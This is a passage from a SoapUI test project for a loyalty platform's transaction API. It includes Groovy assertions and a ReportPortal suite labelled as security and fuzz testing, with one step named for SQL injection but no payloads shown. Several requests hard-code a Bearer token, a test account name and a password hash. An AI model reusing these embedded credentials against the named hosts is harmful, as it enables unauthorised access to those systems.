          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters/>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:interface xsi:type="con:RestService" id="43b4172c-d39c-4d47-8c86-d83a44bf8e42" wadlVersion="http://wadl.dev.java.net/2009/02" name="getTransactionV1" type="rest" definitionUrl="https" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <con:settings/>
    <con:definitionCache type="TEXT"/>
    <con:endpoints>
      <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
    </con:endpoints>
    <con:resource name="get" path="/{version}/transaction/get" id="e5934aae-e313-4e85-b69a-9d7acd63e186">
      <con:settings/>
      <con:parameters>
        <con:parameter>
          <con:name>version</con:name>
          <con:value>version</con:value>
          <con:style>TEMPLATE</con:style>
          <con:default>version</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>format</con:name>
          <con:value>json</con:value>
          <con:style>QUERY</con:style>
          <con:default>json</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>id</con:name>
          <con:value>38286441</con:value>
          <con:style>QUERY</con:style>
          <con:default>38286441</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>type</con:name>
          <con:value>ALL</con:value>
          <con:style>QUERY</con:style>
          <con:default>ALL</con:default>
        </con:parameter>
        <con:parameter>
          <con:name>tenders</con:name>
          <con:value>true</con:value>
          <con:style>QUERY</con:style>
          <con:default>true</con:default>
        </con:parameter>
      </con:parameters>
      <con:method name="Method 1" id="31b65c08-dee0-4f08-b308-76debeedd124" method="GET">
        <con:settings/>
        <con:parameters/>
        <con:request name="Request 1" id="f1ce8a1c-c340-46c3-aa19-9dec4fe686b5" mediaType="application/json">
          <con:settings>
            <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting>
          </con:settings>
          <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
          <con:request/>
          <con:originalUri>https://crm-nightly-new.cc.capillarytech.com/version/transaction/get</con:originalUri>
          <con:credentials>
            <con:username>${#Project#auth_username}</con:username>
            <con:password>${#Project#auth_password}</con:password>
            <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
            <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
            <con:authType>Global HTTP Settings</con:authType>
          </con:credentials>
          <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
          <con:jmsPropertyConfig/>
          <con:parameters>
            <con:entry key="id" value="2147547097"/>
            <con:entry key="version" value="v1.1"/>
          </con:parameters>
        </con:request>
      </con:method>
    </con:resource>
  </con:interface>
  <con:testSuite id="617b1441-f979-4855-baef-f5bc9610b80c" name="Reusable API" disabled="true">
    <con:settings>
      <con:setting id="com.eviware.soapui.impl.wsdl.panels.testcase.JTestRunLog$OptionsForm@max_rows">1000</con:setting>
      <con:setting id="com.eviware.soapui.impl.wsdl.panels.testcase.JTestRunLog$OptionsForm@errors_only">false</con:setting>
    </con:settings>
    <con:runType>PARALLELL</con:runType>
    <con:testCase id="a6919450-66f2-417f-9891-60d4219922a2" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TransactionAdd" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="get txn numer" id="ebafad87-9920-45df-a6d0-64a324a881a2">
        <con:settings/>
        <con:config>
          <script>String timestamp = System.currentTimeMillis().toString()
log.info timestamp
testRunner.testCase.setPropertyValue("tnx_number",timestamp);</script>
        </con:config>
      </con:testStep>
      <con:testStep type="groovy" name="get current date and time" id="022d35e4-b48a-4ff3-afa8-fdccd2adeb35">
        <con:settings/>
        <con:config>
          <script>def getcurrent = Calendar.getInstance()
String current_time = getcurrent.format("yyyy-MM-dd HH:mm:ss");
testRunner.testCase.testSuite.setPropertyValue("current_time",current_time);</script>
        </con:config>
      </con:testStep>
      <con:testStep type="groovy" name="get phone number" id="e2d7ab90-5188-4717-be44-f6c409db964c">
        <con:settings/>
        <con:config>
          <script>String timestamp = System.currentTimeMillis().toString()
String mobile = timestamp.substring(4);
testRunner.testCase.setPropertyValue("mobile","919" + mobile);</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="addTransaction" id="dc6dd2e1-ece2-4167-9d0e-390ca93e8be6">
        <con:settings/>
        <con:config service="addRegularTransaction" resourcePath="/v1.1/transaction/add" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addTransaction" id="30d7b033-bada-4cf6-abdf-781b858869dc" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request>{
  "root": {
    "transaction": {
      "type": "regular",
      "number": "${#TestCase#tnx_number}",
      "amount": "1200",
      "billing_time": "${#TestSuite#current_time}",
      "gross_amount": "101",
      "redemptions": {
        "points_redemptions": {

        },
        "coupon_redemptions": {

        }
      },
      "customer": {
        "mobile": "${#TestCase#mobile}",
        "firstname": "fname_${#TestCase#mobile}",
        "lastname": "lname_${#TestCase#mobile}",
        "email": "${#TestCase#mobile}@gmail.com",
        "type": "loyalty"
      },
      "custom_fields": {
        "field": {
          "name": "testcustom",
          "value": "test"
        }
      },
      "extended_fields": {
        "field": {
          "name": "CentralGST",
          "value": "98"
        }
      },
      "line_items": {
        "line_item": [
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "1",
            "amount": "500",
            "description": "White",
            "item_code": "Pearls",
            "qty": "20",
            "rate": "50",
            "value": "1000",
            "discount": "0",
            "notes": "Return type of a line item with full"
          },
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "2",
            "amount": "500",
            "description": "Extra",
            "item_code": "Extra",
            "qty": "10",
            "rate": "50",
            "value": "500",
            "discount": "0",
            "notes": "Return type of a line item with full"
          },
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "3",
            "amount": "700",
            "description": "Extra",
            "item_code": "Extra",
            "qty": "1",
            "rate": "700",
            "value": "700",
            "discount": "0",
            "notes": "Return type of a line item with full"
          }
        ]
      }
    }
  }
}</con:request>
            <con:originalUri>https://nightly.capillary.in/v1.1/transaction/add</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="e6f1b9ef-b7b8-4fc0-b402-4192ca816b85" name="Verfiy add transaction response">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);


String mob = context.expand('${#TestCase#mobile}')
String tnxNumber = context.expand('${#TestCase#tnx_number}')

// Get customer point info before the tnx.


//get transaction details
String tnxID = json.response.transactions.transaction.id[0].toString();
String billNumber = json.response.transactions.transaction.number[0].toString();
String type = json.response.transactions.transaction.type[0].toString();

assert(billNumber == tnxNumber);
messageExchange.modelItem.testCase.setPropertyValue("tnxID",tnxID);


//get customer details.

String user_id = json.response.transactions.transaction.customer[0].user_id.toString();
messageExchange.modelItem.testCase.setPropertyValue("user_id",user_id);
String mobile = json.response.transactions.transaction.customer[0].mobile.toString();
assert(mobile == mob);
messageExchange.modelItem.testCase.setPropertyValue("tnx_mobile",mobile);
String fname = json.response.transactions.transaction.customer[0].firstname.toString();
assert(fname == "fname_" + mob);
String lname = json.response.transactions.transaction.customer[0].lastname.toString();
assert(lname == "lname_" + mob);
String email = json.response.transactions.transaction.customer[0].email.toString();
assert(email == mob + "@gmail.com")

String awarded_points = json.response.transactions.transaction.side_effects[0].effect.awarded_points[0].toString();
String totalPoints = json.response.transactions.transaction.side_effects[0].effect.total_points[0].toString();

messageExchange.modelItem.testCase.setPropertyValue("awarded_points_afterTnx",awarded_points);

messageExchange.modelItem.testCase.setPropertyValue("totalPoints_afterTnx",totalPoints);



//Item status.
assert(json.response.transactions.transaction.item_status[0].success == "true")
assert(json.response.transactions.transaction.item_status[0].code == 600)
String msg = json.response.transactions.transaction.item_status[0].message;
if(msg.toLowerCase() == "transaction added successfully"){
	assert true;
}
else{
	assert false : "Getting message as - " + msg;
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:assertion type="Valid HTTP Status Codes" id="190ad7c6-4b58-4bce-a46d-8f3e1521b68c" name="Valid HTTP Status Codes">
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#Project#auth_username}</con:username>
              <con:password>${#Project#auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:preemptive>false</con:preemptive>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>tnx_number</con:name>
          <con:value>1591618396257</con:value>
        </con:property>
        <con:property>
          <con:name>tnxID</con:name>
          <con:value>38261500</con:value>
        </con:property>
        <con:property>
          <con:name>user_id</con:name>
          <con:value>379085721</con:value>
        </con:property>
        <con:property>
          <con:name>mobile</con:name>
          <con:value>919618396262</con:value>
        </con:property>
        <con:property>
          <con:name>awarded_points_afterTnx</con:name>
          <con:value>500</con:value>
        </con:property>
        <con:property>
          <con:name>totalPoints_afterTnx</con:name>
          <con:value>500</con:value>
        </con:property>
        <con:property>
          <con:name>pointBalance_afterTnx</con:name>
          <con:value xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
        </con:property>
        <con:property>
          <con:name>tnx_mobile</con:name>
          <con:value>919618396262</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="e2f222e7-9e9d-4be0-926a-e697dbefc4f6" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="TransactionAddForNonDefaultProgram" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="get txn number" id="3256e6ff-bbd0-4566-bd53-e8f859eab140">
        <con:settings/>
        <con:config>
          <script>String timestamp = System.currentTimeMillis().toString()
testRunner.testCase.setPropertyValue("tnx_number",timestamp);</script>
        </con:config>
      </con:testStep>
      <con:testStep type="groovy" name="get current date and time" id="a0053fb7-9bd0-42a4-96cc-bc04b2057922">
        <con:settings/>
        <con:config>
          <script>def getcurrent = Calendar.getInstance()
String current_time = getcurrent.format("yyyy-MM-dd HH:mm:ss");
testRunner.testCase.setPropertyValue("current_time",current_time);</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="addTransactionFromNonDefaultTill" id="af3b04be-ed8e-4f6e-ad7c-d003098990cc">
        <con:settings/>
        <con:config service="addRegularTransaction" resourcePath="/v1.1/transaction/add" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addTransactionFromNonDefaultTill" id="30d7b033-bada-4cf6-abdf-781b858869dc" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Content-Type" value="application/json" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>https://${#Project#application_endpoint}</con:endpoint>
            <con:request>{
  "root": {
    "transaction": {
      "type": "regular",
      "number": "${#TestCase#tnx_number}",
      "amount": "1200",
      "billing_time": "${#TestCase#current_time}",
      "gross_amount": "101",
      "redemptions": {
        "points_redemptions": {

        },
        "coupon_redemptions": {

        }
      },
      "customer": {
        "mobile": "${#TestCase#mobilNuberFromCalledFunction}",
        "firstname": "fname_${#TestCase#mobilNuberFromCalledFunction}",
        "lastname": "lname_${#TestCase#mobilNuberFromCalledFunction}",
        "email": "${#TestCase#mobilNuberFromCalledFunction}@gmail.com",
        "type": "loyalty"
      },
      "custom_fields": {
        "field": {
          "name": "testcustom",
          "value": "test"
        }
      },
      "extended_fields": {
        "field": {
          "name": "CentralGST",
          "value": "98"
        }
      },
      "line_items": {
        "line_item": [
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "1",
            "amount": "500",
            "description": "White",
            "item_code": "Pearls",
            "qty": "20",
            "rate": "50",
            "value": "1000",
            "discount": "0",
            "notes": "Return type of a line item with full"
          },
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "2",
            "amount": "500",
            "description": "Extra",
            "item_code": "Extra",
            "qty": "10",
            "rate": "50",
            "value": "500",
            "discount": "0",
            "notes": "Return type of a line item with full"
          },
          {
            "attributes": {
              "attribute": {
                "name": "jeans",
                "value": "jeans"
              }
            },
            "serial": "3",
            "amount": "700",
            "description": "Extra",
            "item_code": "Extra",
            "qty": "1",
            "rate": "700",
            "value": "700",
            "discount": "0",
            "notes": "Return type of a line item with full"
          }
        ]
      }
    }
  }
}</con:request>
            <con:originalUri>https://nightly.capillary.in/v1.1/transaction/add</con:originalUri>
            <con:assertion type="Valid HTTP Status Codes" id="493f8172-1390-4d91-a9ac-f26069a2fb58" name="Valid HTTP Status Codes">
              <con:configuration>
                <codes>200</codes>
              </con:configuration>
            </con:assertion>
            <con:assertion type="GroovyScriptAssertion" id="ad2f17d6-a168-47ca-a0de-8db6e0276f68" name="Validate non default response">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);


String mob = context.expand('${#TestCase#mobilNuberFromCalledFunction}')
String tnxNumber = context.expand('${#TestCase#tnx_number}')

// Get customer point info before the tnx.


//get transaction details
String tnxID = json.response.transactions.transaction.id[0].toString();
String billNumber = json.response.transactions.transaction.number[0].toString();
String type = json.response.transactions.transaction.type[0].toString();

assert(billNumber == tnxNumber);
messageExchange.modelItem.testCase.setPropertyValue("non_default_tnxID",tnxID);
messageExchange.modelItem.testCase.setPropertyValue("non_default_tnx_number",billNumber);


//get customer details.

String user_id = json.response.transactions.transaction.customer[0].user_id.toString();
messageExchange.modelItem.testCase.setPropertyValue("non_default_tnx_user_id",user_id);
String mobile = json.response.transactions.transaction.customer[0].mobile.toString();
assert(mobile == mob);
messageExchange.modelItem.testCase.setPropertyValue("non_default_tnx_mobile",mobile);
String fname = json.response.transactions.transaction.customer[0].firstname.toString();
assert(fname == "fname_" + mob);
String lname = json.response.transactions.transaction.customer[0].lastname.toString();
assert(lname == "lname_" + mob);
String email = json.response.transactions.transaction.customer[0].email.toString();
assert(email == mob + "@gmail.com")

String lifetime_points = json.response.transactions.transaction.customer[0].lifetime_points.toString();
String totalPoints = json.response.transactions.transaction.customer[0].loyalty_points.toString();

messageExchange.modelItem.testCase.setPropertyValue("non_default_tnx_awarded_points_afterTnx",lifetime_points);

messageExchange.modelItem.testCase.setPropertyValue("non_default_tnx_totalPoints_afterTnx",totalPoints);



//Item status.
assert(json.response.transactions.transaction.item_status[0].success == "true")
assert(json.response.transactions.transaction.item_status[0].code == 600)
String msg = json.response.transactions.transaction.item_status[0].message;
if(msg.toLowerCase() == "transaction added successfully"){
	assert true;
}
else{
	assert false : "Getting message as - " + msg;
}</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:username>${#TestCase#non_default_auth_username}</con:username>
              <con:password>${#TestCase#non_default_auth_password}</con:password>
              <con:selectedAuthProfile>Basic</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>Global HTTP Settings</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>mobilNuberFromCalledFunction</con:name>
          <con:value>919736268900</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_auth_username</con:name>
          <con:value>alpha_endtoend_test</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_auth_password</con:name>
          <con:value>202cb962ac59075b964b07152d234b70</con:value>
        </con:property>
        <con:property>
          <con:name>tnx_number</con:name>
          <con:value>1590736272947</con:value>
        </con:property>
        <con:property>
          <con:name>current_time</con:name>
          <con:value>2020-05-29 12:41:12</con:value>
        </con:property>
        <con:property>
          <con:name>tnxID</con:name>
          <con:value xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
        </con:property>
        <con:property>
          <con:name>user_id</con:name>
          <con:value xsi:nil="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/>
        </con:property>
        <con:property>
          <con:name>non_default_tnxID</con:name>
          <con:value>38260737</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_tnx_user_id</con:name>
          <con:value>379076669</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_tnx_mobile</con:name>
          <con:value>919736268900</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_tnx_awarded_points_afterTnx</con:name>
          <con:value>880</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_tnx_totalPoints_afterTnx</con:name>
          <con:value>880</con:value>
        </con:property>
        <con:property>
          <con:name>non_default_tnx_number</con:name>
          <con:value>1590736272947</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="23925634-f0eb-426a-a829-a89cf00cdd78" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="RegisterNewCustomer" searchProperties="true">
      <con:settings/>
      <con:properties/>
    </con:testCase>
    <con:properties>
      <con:property>
        <con:name>mobile</con:name>
        <con:value>8767496655</con:value>
      </con:property>
      <con:property>
        <con:name>current_time</con:name>
        <con:value>2020-06-08 17:43:16</con:value>
      </con:property>
    </con:properties>
  </con:testSuite>
  <con:testSuite id="08af953c-11b1-4045-afcf-a530baaaf3b1" name="ReportPortal">
    <con:settings/>
    <con:runType>SEQUENTIAL</con:runType>
    <con:testCase id="3fafabd8-9396-4aac-9318-ecc96d909141" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="StartLaunch" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="f1532ba9-b9cf-495b-826d-fa04e6e9df3f">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("startTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="StartLaunch" id="81141f29-85fe-4815-9744-ff6a12cbe7c4">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/launch" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="StartLaunch" id="240e4a6f-472b-4bcb-8174-58f0c32192bc" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
   "name":"${#TestCase#launchName}",
   "description":"My first launch for Security Tests",
   "startTime":"${#TestCase#startTime}",
   "mode":"DEFAULT",
   "attributes":[
      {
         "key":"env",
         "value":"nightly"
      },
      {
         "value":"test"
      }
   ]
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/launch</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="e431e186-83d5-46a9-bcbb-b6a5636aa9b3" name="Script Assertion">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

messageExchange.modelItem.testCase.testSuite.setPropertyValue("launchId", json.id)</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:selectedAuthProfile>No Authorization</con:selectedAuthProfile>
              <con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>startTime</con:name>
          <con:value>1614085124089</con:value>
        </con:property>
        <con:property>
          <con:name>launchName</con:name>
          <con:value>APIFuzzyTEsts</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="66851c6a-d050-4570-98ed-6c31e6c5f853" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="StartTestSuite" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="cf16a911-51a9-4829-868c-2cc9291caa87">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("startTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="startTestSuite" id="f40fcf9b-6015-4e19-ad00-3d5ba3be5207">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="startTestSuite" id="3ee5b2d3-d2de-4b83-ad07-14aa3a57b2e6" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment xmlns:con="http://eviware.com/soapui/config">
  &lt;con:entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f"/>
  &lt;con:entry key="Content-Type" value="application/json"/>
&lt;/xml-fragment></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
   "name":"${#TestCase#suiteName}",
   "startTime":"${#TestCase#startTime}",
   "type":"suite",
   "launchUuid":"${#TestSuite#launchId}",
   "description":"Security Test Suits"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="b343daf4-8a01-4504-8ef5-c433f54a5490" name="Script Assertion">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

messageExchange.modelItem.testCase.testSuite.setPropertyValue("suiteId", json.id)</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters/>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>suiteName</con:name>
          <con:value>CustomerAPIFuzzyTestSuits</con:value>
        </con:property>
        <con:property>
          <con:name>startTime</con:name>
          <con:value>1614085124453</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="dd466267-edb9-4688-a9bd-8b50c8a66c8b" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="StartTestCase" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="b1974040-37e0-46cf-b024-dfdd6017dddc">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("startTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="startTestCase" id="e2779b9d-7794-4d9b-a732-d50ff399cf1b">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item/{itemId}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="startTestCase" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
   "name":"${#TestCase#caseName}",
   "startTime":"${#TestCase#startTime}",
   "type":"test",
   "launchUuid":"${#TestSuite#launchId}",
   "description":"CustomerAddSecurityTest"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="de1017bc-09fb-493d-a758-27db1c82ca6d" name="Script Assertion">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

messageExchange.modelItem.testCase.testSuite.setPropertyValue("caseId", json.id)</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="itemId" value="${#TestSuite#suiteId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>caseName</con:name>
          <con:value>getCustomerAPI</con:value>
        </con:property>
        <con:property>
          <con:name>startTime</con:name>
          <con:value>1614085124760</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="ce65d8d3-3867-4f28-9563-3067a612509d" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="StartTestStep" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="3c2add20-c480-4f25-917d-bb22e2a15453">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();
testRunner.testCase.setPropertyValue("startTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="startstep" id="b090d3b8-5bc0-4b8f-9503-4caf3111e147">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/item/{itemId}" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="startstep" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
            <con:settings>
              <con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;entry key="Authorization" value="Bearer 3c24e31f-e667-4ecd-8b80-91b42abccc8f" xmlns="http://eviware.com/soapui/config"/></con:setting>
            </con:settings>
            <con:endpoint>http://qareportportal.capillary.in</con:endpoint>
            <con:request>{
   "name":"${#TestCase#stepName}",
   "startTime":"${#TestCase#startTime}",
   "type":"step",
   "launchUuid":"${#TestSuite#launchId}",
   "description":"${#TestCase#stepName}"
}</con:request>
            <con:originalUri>http://qareportportal.capillary.in/api/v1/superadmin_personal/item/auto%3Aeee9059fa62091ec6e87f2d2f8937ba0</con:originalUri>
            <con:assertion type="GroovyScriptAssertion" id="121e7b6c-e45b-48ee-b234-eda41d911f4a" name="Script Assertion">
              <con:configuration>
                <scriptText>import groovy.json.JsonSlurper;

String response = messageExchange.getResponseContent();
def json = new JsonSlurper().parseText(response);

messageExchange.modelItem.testCase.testSuite.setPropertyValue("stepId", json.id)</scriptText>
              </con:configuration>
            </con:assertion>
            <con:credentials>
              <con:authType>No Authorization</con:authType>
            </con:credentials>
            <con:jmsConfig JMSDeliveryMode="PERSISTENT"/>
            <con:jmsPropertyConfig/>
            <con:parameters>
              <entry key="itemId" value="${#TestSuite#caseId}" xmlns="http://eviware.com/soapui/config"/>
            </con:parameters>
          </con:restRequest>
        </con:config>
      </con:testStep>
      <con:properties>
        <con:property>
          <con:name>stepName</con:name>
          <con:value>SQL Injectionfor [customerGet]</con:value>
        </con:property>
        <con:property>
          <con:name>startTime</con:name>
          <con:value>1613468037837</con:value>
        </con:property>
      </con:properties>
    </con:testCase>
    <con:testCase id="096e6dfa-f1e2-4478-91c5-fce49349871d" failOnError="true" failTestCaseOnErrors="true" keepSession="false" maxResults="0" name="addLog" searchProperties="true">
      <con:settings/>
      <con:testStep type="groovy" name="Groovy Script" id="926b8d73-e02d-4338-ad89-14cb99c7343e">
        <con:settings/>
        <con:config>
          <script>Date now = new Date();
def timestamp = now.getTime().toString();

msg = testRunner.testCase.getPropertyValue("message")


testRunner.testCase.setPropertyValue("startTime",timestamp)</script>
        </con:config>
      </con:testStep>
      <con:testStep type="restrequest" name="addLog" id="528ea2a8-d476-486c-ad1d-fd95907cc860">
        <con:settings/>
        <con:config service="ReportPortal" resourcePath="/api/v1/superadmin_personal/log" methodName="Method 1" xsi:type="con:RestRequestStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
          <con:restRequest name="addLog" id="bf804461-2728-4247-b175-2cd2dcdbb747" mediaType="application/json" postQueryString="false">
            <con:settings>
